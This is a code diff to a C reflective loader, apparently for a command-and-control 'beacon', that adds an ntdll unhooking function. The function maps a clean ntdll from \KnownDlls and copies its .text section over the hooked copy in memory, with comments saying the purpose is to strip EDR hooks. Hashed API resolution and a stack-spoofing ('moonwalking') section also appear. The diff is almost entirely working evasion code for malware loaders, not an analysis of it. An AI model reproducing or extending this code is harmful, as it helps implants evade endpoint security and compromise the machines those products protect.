@@ -62,6 +62,14 @@ void * DawsonLoader()
 
     getApis(api);
 
+    // ========== UNHOOK NTDLL ==========
+    // Remove EDR hooks from ntdll before executing any syscalls
+    // This restores clean syscall stubs from \KnownDlls\ntdll.dll
+    if (!unhook_ntdll(api, ntdll)) {
+        // Unhooking failed - not fatal, continue anyway
+        // (may be no hooks present, or KnownDlls not available)
+    }
+
     checkUseRWX(raw_beacon);
 
     virtual_beacon->dllBase = NULL;
@@ -705,6 +713,9 @@ void getApis(APIS * api){
     api->pNtAllocateVirtualMemory     = xGetProcAddress_hash( NTALLOCATEVIRTUALMEMORY      , &ntdll  );
     api->pNtProtectVirtualMemory      = xGetProcAddress_hash( NTPROTECTVIRTUALMEMORY       , &ntdll  );
     api->pNtFreeVirtualMemory         = xGetProcAddress_hash( NTFREEVIRTUALMEMORY          , &ntdll  );
+    api->pNtOpenSection               = xGetProcAddress_hash( NTOPENSECTION                , &ntdll  );
+    api->pNtMapViewOfSection          = xGetProcAddress_hash( NTMAPVIEWOFSECTION           , &ntdll  );
+    api->pNtUnmapViewOfSection        = xGetProcAddress_hash( NTUNMAPVIEWOFSECTION         , &ntdll  );
     api->LdrLoadDll                   = xGetProcAddress_hash( LDRLOADDLL                   , &ntdll  );
     api->RtlAnsiStringToUnicodeString = xGetProcAddress_hash( RTLANSISTRINGTOUNICODESTRING , &ntdll  );
     api->LdrGetProcedureAddress       = xGetProcAddress_hash( LDRGETPROCEDUREADDRESS       , &ntdll  );
@@ -1795,6 +1806,105 @@ __asm__(
     "ret           \n"
 
 );
+
+// ========== NTDLL UNHOOKING IMPLEMENTATION ==========
+// Removes EDR hooks from ntdll by restoring clean syscall stubs
+
+BOOL unhook_ntdll(APIS* api, Dll* ntdll) {
+    NTSTATUS status;
+    HANDLE hSection = NULL;
+    PVOID clean_ntdll = NULL;
+    SIZE_T viewSize = 0;
+
+    // Open \KnownDlls\ntdll.dll (clean copy maintained by kernel)
+    UNICODE_STRING section_name;
+    WCHAR section_path[] = L"\\KnownDlls\\ntdll.dll";
+    section_name.Buffer = section_path;
+    section_name.Length = sizeof(section_path) - sizeof(WCHAR);
+    section_name.MaximumLength = sizeof(section_path);
+
+    OBJECT_ATTRIBUTES oa = {0};
+    oa.Length = sizeof(OBJECT_ATTRIBUTES);
+    oa.ObjectName = &section_name;
+
+    // Open section
+    status = ((NTSTATUS (*)(HANDLE*, ACCESS_MASK, POBJECT_ATTRIBUTES))api->pNtOpenSection)(
+        &hSection, SECTION_MAP_READ, &oa);
+    if (status != 0 || !hSection) {
+        return FALSE;  // Can't open KnownDlls, unhooking failed
+    }
+
+    // Map clean ntdll into our process
+    status = ((NTSTATUS (*)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PVOID, PSIZE_T, DWORD, ULONG, ULONG))api->pNtMapViewOfSection)(
+        hSection,
+        NtCurrentProcess(),
+        &clean_ntdll,
+        0,
+        0,
+        NULL,
+        &viewSize,
+        1,  // ViewUnmap
+        0,
+        PAGE_READONLY
+    );
+
+    if (status != 0 || !clean_ntdll) {
+        // hSection will be cleaned up on process exit
+        return FALSE;
+    }
+
+    // Parse clean ntdll headers
+    Dll clean_dll = {0};
+    clean_dll.dllBase = clean_ntdll;
+    parse_module_headers(&clean_dll);
+
+    // Find .text section in both hooked and clean ntdll
+    PVOID hooked_text = ntdll->text_section;
+    PVOID clean_text = clean_dll.text_section;
+    SIZE_T text_size = ntdll->text_section_size;
+
+    if (!hooked_text || !clean_text || text_size == 0) {
+        ((NTSTATUS (*)(HANDLE, PVOID))api->pNtUnmapViewOfSection)(NtCurrentProcess(), clean_ntdll);
+        return FALSE;
+    }
+
+    // Change protection on hooked ntdll .text to RWX
+    DWORD old_protect = 0;
+    SIZE_T region_size = text_size;
+    status = ((NTSTATUS (*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG))api->pNtProtectVirtualMemory)(
+        NtCurrentProcess(),
+        &hooked_text,
+        &region_size,
+        PAGE_EXECUTE_READWRITE,
+        &old_protect
+    );
+
+    if (status != 0) {
+        ((NTSTATUS (*)(HANDLE, PVOID))api->pNtUnmapViewOfSection)(NtCurrentProcess(), clean_ntdll);
+        return FALSE;
+    }
+
+    // Copy clean .text section over hooked one
+    for (SIZE_T i = 0; i < text_size; i++) {
+        ((BYTE*)hooked_text)[i] = ((BYTE*)clean_text)[i];
+    }
+
+    // Restore original protection
+    DWORD temp = 0;
+    ((NTSTATUS (*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG))api->pNtProtectVirtualMemory)(
+        NtCurrentProcess(),
+        &hooked_text,
+        &region_size,
+        old_protect,
+        &temp
+    );
+
+    // Cleanup
+    ((NTSTATUS (*)(HANDLE, PVOID))api->pNtUnmapViewOfSection)(NtCurrentProcess(), clean_ntdll);
+    // hSection will be cleaned up on process exit
+
+    return TRUE;
+}
 
 // ========== STACK MOONWALKING IMPLEMENTATION ==========
 // Proper implementation with valid ntdll addresses and atomic operations
